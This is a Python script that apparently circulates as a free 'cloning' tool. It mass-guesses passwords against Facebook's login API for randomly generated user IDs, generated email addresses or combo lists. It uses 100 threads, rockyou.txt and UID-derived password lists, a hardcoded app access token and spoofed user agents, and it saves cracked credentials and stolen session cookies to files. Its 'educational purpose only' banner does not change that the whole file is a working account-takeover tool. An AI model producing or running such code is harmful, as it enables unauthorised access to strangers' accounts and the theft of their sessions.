#=====[🌿]CREATOR : MAAZ KING
#=====[🌿]TELEGRAM : @LabbaikSupport

import os, sys, json, uuid, string, random, requests
from time import sleep
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# ===== COLOR CODES =====
R = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;226m'
B = '\x1b[38;5;44m'
P = '\x1b[38;5;201m'
W = '\x1b[0;97m'
N = '\x1b[0m'

class MAAZTOOL:
    def __init__(self):
        self.loop = 0
        self.oks, self.cps, self.generated_ids = [], [], []
        self.chunk_size = 5000
        self.rockyou_path = os.path.expanduser("~/rockyou.txt")
        self.wordlist = self.load_passwords()

    def banner(self):
        os.system("clear")
        print(f"""{G}
███████╗ █████╗ ███████╗███████╗
██╔════╝██╔══██╗╚══███╔╝██╔════╝
█████╗  ███████║  ███╔╝ █████╗  
██╔══╝  ██╔══██║ ███╔╝  ██╔══╝  
██║     ██║  ██║███████╗███████╗
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
╔══════════════════════════════════╗
║ • Creator  : MAAZ KING           ║
║ • Tools    : MAAZ TOOL           ║
║ • Version  : v2.0                ║
║ • Status   : Free                ║
╚══════════════════════════════════╝{N}")
        print(f"{W}USE AT YOUR OWN RISK | EDUCATIONAL PURPOSE ONLY\n{N}")

    def menu(self):
        self.banner()
        print(f"""
{G}[1]  Random Method
[2]  Business Method
[3]  Combo Method
[4]  Dump Method
[5]  Series Method
""")
        choice = input(f"{Y}Select Option ➤ {G}")
        if choice == '1': self.random_method()
        elif choice == '2': self.business_method()
        elif choice == '3': self.combo_method()
        elif choice == '4': self.dump_method()
        elif choice == '5': self.series_method()
        else:
            print(f"{R}Invalid choice.{N}"); sys.exit()

    def series_method(self):
        self.banner()
        print(f"""
{G}Select UID Series:
[1] 100001
[2] 100002
[3] 100003
[4] 100004
[5] 100005
""")
        series_options = {'1': '100001', '2': '100002', '3': '100003', '4': '100004', '5': '100005'}
        choice = input(f"{Y}Select Series ➤ {G}")
        prefix = series_options.get(choice)
        if not prefix:
            print(f"{R}Invalid selection.{N}"); return

        print(f"""
{G}Select ID Limit:
[1] 5000
[2] 10000
[3] 99999
""")
        limits = {'1': 5000, '2': 10000, '3': 99999}
        limit_choice = input(f"{Y}Choose ➤ {G}")
        limit = limits.get(limit_choice)
        if not limit:
            print(f"{R}Invalid limit.{N}"); return

        for _ in range(limit):
            rand = ''.join(random.choices(string.digits, k=7))
            self.generated_ids.append(prefix + rand)

        print(f"{B}[✓] Cloning started with {limit} IDs... Please wait{N}")
        self.start_cloning()

    def random_method(self):
        self.banner()
        prefix = ''.join(random.choices(string.digits, k=5))
        limit = int(input(f"{Y}Enter ID Limit ➤ {G}"))
        for _ in range(limit):
            uid = prefix + ''.join(random.choices(string.digits, k=7))
            self.generated_ids.append(uid)
        print(f"{B}[✓] Starting Random UID Cloning...{N}")
        self.start_cloning()

    def business_method(self):
        self.banner()
        domain = input(f"{Y}Enter Email Domain (e.g. gmail.com) ➤ {G}")
        limit = int(input(f"{Y}Enter Combo Limit ➤ {G}"))
        for _ in range(limit):
            name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=7))
            self.generated_ids.append(name + "@" + domain)
        print(f"{B}[✓] Starting Business Email Cloning...{N}")
        self.start_cloning()

    def combo_method(self):
        self.banner()
        if not os.path.exists("combo.txt"):
            print(f"{R}combo.txt not found!{N}"); return
        with open("combo.txt") as f:
            for line in f:
                parts = line.strip().split("|")
                if len(parts) == 2:
                    uid, pw = parts
                    self.api_crack(uid, [pw])

    def dump_method(self):
        self.banner()
        print(f"{Y}This feature requires UID dumper integration (Coming Soon).{N}")

    def start_cloning(self):
        with ThreadPool(max_workers=100) as pool:
            for uid in self.generated_ids:
                pwlist = self.smart_passwords(uid, self.wordlist)
                pool.submit(self.api_crack, uid, pwlist)
        self.summary()

    def smart_passwords(self, uid, wordlist):
        return list(set([
            uid, uid[:6], uid[-6:], uid[-7:],
            "786786", "123456", "pakistan", "iloveyou"
        ] + wordlist[:5]))

    def load_passwords(self):
        if not os.path.exists(self.rockyou_path):
            print(f"{R}rockyou.txt not found in home directory.{N}"); return []
        with open(self.rockyou_path, "r", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()][:self.chunk_size]

    def api_crack(self, uid, passlist):
        sys.stdout.write(f"\r{W}MAAZ-TOOL {self.loop} | OK: {G}{len(self.oks)}{W} | CP: {Y}{len(self.cps)}{N} ")
        sys.stdout.flush()
        for pw in passlist:
            try:
                session = requests.Session()
                headers = {'User-Agent': self.get_ua()}
                data = {
                    'email': uid,
                    'password': pw,
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'locale': 'en_US',
                    'format': 'json'
                }
                r = session.post("https://b-api.facebook.com/method/auth.login", data=data, headers=headers).json()
                if "access_token" in r:
                    print(f"\r{G}[OK] {uid} | {pw}{N}")
                    open("maaz-OLD.txt", "a").write(f"{uid}|{pw}\n")
                    coki = r.get("session_cookies", [])
                    if coki:
                        cookie = ";".join(f"{c['name']}={c['value']}" for c in coki)
                        open("maaz-COOKIE.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
                    self.oks.append(uid)
                    break
                elif "www.facebook.com" in r.get("error_msg", ""):
                    print(f"\r{Y}[CP] {uid} | {pw}{N}")
                    open("maaz-CP.txt", "a").write(f"{uid}|{pw}\n")
                    self.cps.append(uid)
                    break
            except: pass
        self.loop += 1

    def summary(self):
        print(f"\n{Y}{'-'*40}")
        print(f"{G}CLONING FINISHED! OK: {len(self.oks)} | CP: {len(self.cps)}{N}")
        print(f"{Y}Saved: maaz-OLD.txt | maaz-CP.txt | maaz-COOKIE.txt{N}")

    def get_ua(self):
        return f"Mozilla/5.0 (Linux; Android 13; Redmi Note 13 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.{random.randint(1000,5000)}.100 Mobile Safari/537.36"

if __name__ == "__main__":
    MAAZTOOL().menu()
